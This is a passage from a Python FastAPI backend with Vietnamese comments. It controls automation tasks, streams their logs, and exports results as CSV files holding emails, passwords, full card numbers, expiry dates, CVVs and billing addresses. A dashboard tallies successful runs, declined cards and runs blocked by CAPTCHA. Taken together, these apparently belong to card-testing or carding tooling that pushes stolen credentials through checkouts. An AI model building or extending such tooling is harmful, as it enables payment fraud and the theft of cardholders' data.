    running_tasks[tid]["thread"] = t

    return {"task_id": tid, "status": "running"}

@app.post("/api/tasks/{tid}/stop")
def stop_task(tid: str):
    if tid not in running_tasks:
        raise HTTPException(404, "Task not found")
    running_tasks[tid]["alive"] = False
    running_tasks[tid]["status"] = "stopped"
    # Giải phóng mọi wait() để thread thoát ngay
    ka = running_tasks[tid].get("_keep_alive")
    if ka: ka.set()
    se = running_tasks[tid].get("_stop_event")
    if se: se.set()
    push_task_log(tid, "⛔ Đã dừng bởi người dùng")
    return {"ok": True}

@app.post("/api/tasks/stop-all")
def stop_all_tasks():
    stopped = 0
    for tid, t in running_tasks.items():
        if t.get("status") in ("running", "starting"):
            t["alive"] = False
            t["status"] = "stopped"
            ka = t.get("_keep_alive")
            if ka: ka.set()
            se = t.get("_stop_event")
            if se: se.set()
            stopped += 1
    return {"stopped": stopped}

@app.get("/api/tasks/{tid}/status")
def task_status(tid: str):
    if tid not in running_tasks:
        raise HTTPException(404, "Task not found")
    t = running_tasks[tid]
    return {
        "id": tid,
        "status": t["status"],
        "total": t["total"],
        "done": t["done"],
        "logs": list(t["logs"]),
        "results": t["results"],
        "profile_name": t["profile_name"],
    }

@app.get("/api/tasks")
def list_tasks():
    return [
        {
            "id": tid,
            "script_id": t["script_id"],
            "profile_name": t["profile_name"],
            "status": t["status"],
            "total": t["total"],
            "done": t["done"],
            "created_at": t["created_at"],
            "logs": list(t["logs"]),
        }
        for tid, t in running_tasks.items()
    ]

@app.get("/api/tasks/all-results")
def get_all_results():
    all_rows = []
    for tid, t in running_tasks.items():
        for r in t.get("results", []):
            all_rows.append({**r, "_task_id": tid})
    return {"results": all_rows, "total": len(all_rows)}

@app.get("/api/tasks/{tid}/results.csv")
def download_results(tid: str):
    if tid not in running_tasks:
        raise HTTPException(404, "Task not found")
    results = running_tasks[tid]["results"]
    fields = ["email","password","card_number","exp_month","exp_year","cvv","cardholder_name","address","city","state","zip","status"]
    buf = io.StringIO()
    writer = csv.DictWriter(buf, fieldnames=fields, extrasaction="ignore")
    writer.writeheader()
    writer.writerows(results)
    return PlainTextResponse(buf.getvalue(), media_type="text/csv",
                             headers={"Content-Disposition": f'attachment; filename="results_{tid}.csv"'})


# ══════════════════════════════════════════════════════════════════════════════
# DECLINED RESULTS API
# ══════════════════════════════════════════════════════════════════════════════
@app.get("/api/declined")
def get_declined():
    return load_declined()

@app.delete("/api/declined")
def clear_declined():
    DECLINED_FILE.write_text(json.dumps({"records": []}, indent=2))
    return {"cleared": True}

@app.get("/api/dashboard")
def get_dashboard():
    """Tổng hợp hiệu suất automation: tất cả tasks + declined."""
    tasks   = list(running_tasks.values())
    declined_data = load_declined()
    declined_records = declined_data.get("records", [])

    total_ran    = sum(t.get("done", 0) for t in tasks)
    total_success= sum(
        1 for t in tasks
        for r in t.get("results", [])
        if r.get("status") == "success"
    )
    total_declined = len(declined_records)
    total_failed = sum(
        1 for t in tasks
        for r in t.get("results", [])
        if r.get("status") not in ("success", "pending", "captcha_blocked")
    )
    total_captcha= sum(
        1 for t in tasks
        for r in t.get("results", [])
        if r.get("status") == "captcha_blocked"
    )
    running_count = sum(1 for t in tasks if t.get("status") == "running")

    return {
        "summary": {
            "total_ran":      total_ran,
            "success":        total_success,
            "declined":       total_declined,
            "failed":         total_failed,
            "captcha_blocked":total_captcha,
            "running":        running_count,
        },
        "declined_records": declined_records[-200:],  # 200 gần nhất
        "tasks": [
            {
                "id":      t.get("id"),
                "profile": t.get("profile_name", ""),
                "status":  t.get("status"),
                "done":    t.get("done", 0),
                "total":   t.get("total", 0),
                "created": t.get("created_at", ""),
                "results": [
                    {"email": r.get("email",""), "card": r.get("card_number","")[:4]+"****" if r.get("card_number") else "", "status": r.get("status","")}
                    for r in t.get("results", [])
                ],
            }
            for t in tasks
        ],
    }

# ─── Static ────────────────────────────────────────────────────────────────────
app.mount("/static", StaticFiles(directory="static"), name="static")

@app.get("/api/version")
def api_version():
    try:
        import json as _json
        with open("version.json", "r") as f:
            return _json.load(f)
    except Exception:
        return {"version": "unknown"}

@app.get("/")
def root():
    return FileResponse("static/index.html")

def _is_server_up(port: int) -> bool:
    import socket
    try:
        with socket.create_connection(("127.0.0.1", port), timeout=0.5):
            return True
    except OSError:
        return False

if __name__ == "__main__":
    import uvicorn
    import webbrowser
    import os

    PORT = 8099

    # ── Chống mở 2 tab ──────────────────────────────────────────────
    # Lỗi cũ: StartApp.bat/.sh mở tab + main.py mở tab → 2 tab.
    # Nay: CHỈ main.py mở browser, và chỉ mở 1 lần duy nhất.
    # Nếu server đã chạy sẵn (chạy lại app) → không mở thêm tab, thoát.
    if _is_server_up(PORT):
        print(f"[i] App đã chạy sẵn tại http://localhost:{PORT} — mở tab có sẵn.")
        try:
            webbrowser.open(f"http://localhost:{PORT}")
        except Exception:
            pass
        sys.exit(0)

    # Reloader của uvicorn sẽ spawn process con → biến môi trường để chỉ
    # process cha mở browser, tránh mở 2 lần.
    _opened_flag = os.environ.get("_DROPAUDIT_BROWSER_OPENED")

    def open_browser():
        # đợi server thật sự lắng nghe rồi mới mở (tránh trang lỗi)
        for _ in range(40):
            if _is_server_up(PORT):
                break
            time.sleep(0.25)
        webbrowser.open(f"http://localhost:{PORT}")

    if not _opened_flag:
        os.environ["_DROPAUDIT_BROWSER_OPENED"] = "1"
        threading.Thread(target=open_browser, daemon=True).start()

    # reload=False → không spawn process con → không mở 2 tab
    uvicorn.run(app, host="0.0.0.0", port=PORT, log_level="info", reload=False)
